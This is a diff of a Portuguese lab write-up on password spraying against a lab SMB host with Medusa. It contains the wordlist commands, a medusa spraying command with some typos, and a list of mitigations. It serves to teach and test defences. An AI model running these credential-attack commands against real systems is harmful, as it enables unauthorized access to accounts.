@@ -16,6 +16,8 @@
 - users.txt
 - passwords.txt
 
+Linhas de comando:
+
 ```
 ──(kali@kali)-[~]
 └─$ echo -e "user \\nmsfadmin\nadmin\nroot" > users.txt
@@ -151,12 +153,13 @@ WARNING: Invalid method: FAIL=Login failed.
 
 ## Password spraying em SMB com enumeração de usuários.
 
-Linhas de comando:
+Linhas de comando para gerar os senhas:
 ```
 echo -e "user\nadmin\nmsfadmin\nservice" > smb_users.txt 
 echo -e "passowrd\n123456\nWelome123\nmsfadmin" > senhas_spray.txt
 ```
 
+O comando: 
 ```
 medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smnt -t 2- T50
 ```
@@ -189,7 +192,7 @@ Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.n
 └─$ 
 ```
 
-Para fina de confimação de acesso encontrado, executamos:
+Para validação do acesso encontrado, executamos:
 
 ```
 (kali㉿kali)-[~]
@@ -226,11 +229,11 @@ Reconnecting with SMB1 for workgroup listing.
 
 ## Recomendações de mitigação
 
-Autenticação por multiplos fatores, pelo menos em 2 etapas(2MFA); \
-Senhas fortes, como simbolos, sem palavras de dicionário e com datas de expiração de senha; \
-Bloqueio de IPs, após identicafação de várias tentativas de login; \
-Segregação de rede; \
-Realizar auditorias regulares, usando ferramentas como medusa e outros métodos para fins de testes.
+- Autenticação por multiplos fatores, pelo menos em 2 etapas(2MFA); \
+- Senhas fortes, como simbolos, sem palavras de dicionário e com datas de expiração de senha; \
+- Bloqueio de IPs, após identicafação de várias tentativas de login; \
+- Segregação de rede; \
+- Realizar auditorias regulares, usando ferramentas como medusa e outros métodos para fins de testes.
 
 
 ## Resutados
